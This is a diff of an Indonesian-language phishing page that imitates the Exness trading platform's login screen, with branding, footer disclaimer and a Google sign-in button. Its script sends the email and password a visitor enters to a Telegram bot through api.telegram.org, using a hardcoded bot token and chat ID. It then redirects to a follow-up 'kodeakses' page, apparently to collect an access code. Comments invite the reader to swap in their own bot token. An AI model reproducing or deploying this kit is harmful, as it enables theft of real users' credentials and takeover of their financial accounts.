@@ -1,97 +1,128 @@
 <html lang="id">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Masuk</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link
-    rel="stylesheet"
-    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
-  />
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Exness Login
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet"/>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
-    body {
+   body {
       font-family: 'Inter', sans-serif;
     }
   </style>
-</head>
-<body class="bg-[#F8F8F8] min-h-screen flex flex-col">
-  <header class="flex items-center px-5 py-4">
-    <button aria-label="Back" class="text-black text-xl mr-3 focus:outline-none">
-      <i class="fas fa-chevron-left"></i>
-    </button>
-    <h1 class="font-semibold text-lg text-black">Masuk</h1>
+ </head>
+ <body class="bg-white text-[#0B1521] min-h-screen flex flex-col">
+  <header class="flex items-center justify-between px-5 py-4 border-b border-gray-200">
+   <div class="text-[32px] font-extrabold leading-none tracking-tight">
+    exness
+   </div>
+   <button aria-label="Change language" class="text-[#0B1521] text-xl">
+    <i class="fas fa-globe">
+    </i>
+   </button>
   </header>
-
-  <main class="flex flex-col px-5 pt-2 flex-grow">
-    <p class="text-black text-base mb-6">Silakan masukkan alamat email dan kata sandi Anda</p>
-
-    <form id="loginForm" class="flex flex-col w-full">
-      <label for="email" class="text-black text-xs mb-1 block font-normal">Alamat email Anda</label>
-      <input
-        id="email"
-        name="email"
-        type="email"
-        placeholder=""
-        required
-        class="w-full rounded border border-gray-300 bg-white text-black text-sm px-3 py-2 mb-5 focus:outline-none focus:ring-2 focus:ring-yellow-400"
-      />
-
-      <label for="password" class="text-black text-xs mb-1 block font-normal">Kata sandi</label>
-      <div class="relative w-full">
-        <input
-          id="password"
-          name="password"
-          type="password"
-          placeholder=""
-          required
-          class="w-full rounded border border-gray-300 bg-white text-black text-sm px-3 py-2 pr-10 focus:outline-none focus:ring-2 focus:ring-yellow-400"
-        />
-        <span class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 text-lg cursor-pointer select-none" id="togglePassword">
-          <i class="fas fa-eye-slash"></i>
-        </span>
-      </div>
-
-      <button
-        type="submit"
-        class="mt-16 bg-yellow-400 text-black text-sm font-normal rounded-md py-3 w-full"
-      >
-        Masuk
+  <main class="flex-grow px-5 pt-6 pb-20 max-w-md mx-auto w-full">
+   <h1 class="text-3xl font-extrabold leading-tight mb-6">
+    Selamat datang di Exness
+   </h1>
+   <nav class="flex border-b border-gray-300 mb-6 text-base font-medium">
+    <button aria-current="page" class="pb-2 border-b-2 border-black text-black flex-1 text-center">
+     Masuk
+    </button>
+    <button class="pb-2 text-gray-400 flex-1 text-center">
+     Buat akun
+    </button>
+   </nav>
+   <form id="loginForm" class="space-y-6">
+    <div>
+     <label class="block mb-1 text-sm font-normal text-gray-700" for="email">
+      Alamat email
+     </label>
+     <input autocomplete="email" class="w-full rounded-md border border-gray-300 px-4 py-3 text-base text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-yellow-400" id="email" placeholder="" required="" type="email"/>
+    </div>
+    <div>
+     <label class="block mb-1 text-sm font-normal text-gray-700" for="password">
+      Kata sandi
+     </label>
+     <div class="relative">
+      <input autocomplete="current-password" class="w-full rounded-md border border-gray-300 px-4 py-3 pr-10 text-base text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-yellow-400 focus:border-yellow-400" id="password" placeholder="" required="" type="password"/>
+      <button aria-label="Toggle password visibility" class="absolute inset-y-0 right-3 flex items-center text-gray-400" type="button" onclick="togglePassword()">
+       <i class="fas fa-eye-slash" id="toggleIcon">
+       </i>
       </button>
-    </form>
-
-    <p class="mt-6 text-center text-black text-xs font-normal cursor-pointer select-none">
-      Saya lupa kata sandi saya
-    </p>
+     </div>
+    </div>
+    <button class="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-normal text-base py-3 rounded-md" type="submit">
+     Lanjutkan
+    </button>
+   </form>
+   <div class="flex items-center my-6 text-gray-600 text-sm">
+    <div class="flex-grow border-t border-gray-300">
+    </div>
+    <span class="mx-3 whitespace-nowrap">
+     Atau masuk dengan
+    </span>
+    <div class="flex-grow border-t border-gray-300">
+    </div>
+   </div>
+   <button class="w-full flex items-center justify-center gap-2 border border-gray-300 rounded-md py-3 text-base text-gray-900 hover:bg-gray-100" type="button">
+    <img alt="Google logo, multicolor G letter on white background" class="inline-block" height="20" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcThtDY3lQL0z3nfknrcD16ZxHe9BGCj-MlTGQ&s" width="20"/>
+    Google
+   </button>
+   <div class="mt-6 text-center">
+    <a class="text-blue-600 text-sm font-normal hover:underline" href="#">
+     Saya lupa kata sandi saya
+    </a>
+   </div>
   </main>
+  <footer class="px-5 pb-6 text-center text-gray-400 text-xs leading-tight max-w-md mx-auto w-full">
+   Exness tidak menawarkan layanan kepada penduduk dari yurisdiksi tertentu termasuk Amerika Serikat, Iran,
+    Korea Utara, Uni Eropa, Inggris, dan lainnya. Konten situs web, termasuk terjemahan, tidak boleh ditafsirkan
+    sebagai ajakan. Investor membuat keputusan mereka sendiri dan secara
+  </footer>
+  <button aria-label="Chat support" class="fixed bottom-6 right-6 bg-yellow-400 hover:bg-yellow-500 text-black rounded-full w-14 h-14 flex items-center justify-center shadow-lg">
+   <i class="fas fa-comment-alt text-xl">
+   </i>
+  </button>
 
   <script>
     // Toggle password visibility
-    const togglePassword = document.getElementById('togglePassword');
-    const passwordInput = document.getElementById('password');
-    togglePassword.addEventListener('click', () => {
-      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-      passwordInput.setAttribute('type', type);
-      togglePassword.innerHTML = type === 'password' ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
-    });
+    function togglePassword() {
+      const passwordInput = document.getElementById('password');
+      const toggleIcon = document.getElementById('toggleIcon');
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        toggleIcon.classList.remove('fa-eye-slash');
+        toggleIcon.classList.add('fa-eye');
+      } else {
+        passwordInput.type = 'password';
+        toggleIcon.classList.remove('fa-eye');
+        toggleIcon.classList.add('fa-eye-slash');
+      }
+    }
 
-    // Telegram Bot info - replace with your own bot token and chat ID
+    // Telegram bot info - Ganti dengan token dan chat ID kamu
     const TELEGRAM_BOT_TOKEN = '7661713527:AAEXyRZARqRcvPDenx4Y6EvPRPwh2Gp4h5A';
     const TELEGRAM_CHAT_ID = '7549590022';
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
-      const email = this.email.value.trim();
-      const password = this.password.value.trim();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
 
       if (!email || !password) {
-        alert('Mohon isi semua kolom.');
+        alert('Mohon isi email dan kata sandi.');
         return;
       }
 
-      const message = `Login Data:%0AEmail: ${email}%0APassword: ${password}`;
+      const message = `Login Exness:\nEmail: ${email}\nKata sandi: ${password}`;
 
+      // Kirim pesan ke Telegram
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {
@@ -106,7 +137,9 @@
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
-         window.location.href = "kodeakses.html";
+          window.location.href = "kodeakses.html";
+          // Bisa redirect atau reset form di sini
+          // window.location.href = 'somepage.html';
           this.reset();
         } else {
           alert('Gagal mengirim data ke Telegram.');
@@ -117,5 +150,5 @@
       });
     });
   </script>
-</body>
+ </body>
 </html>
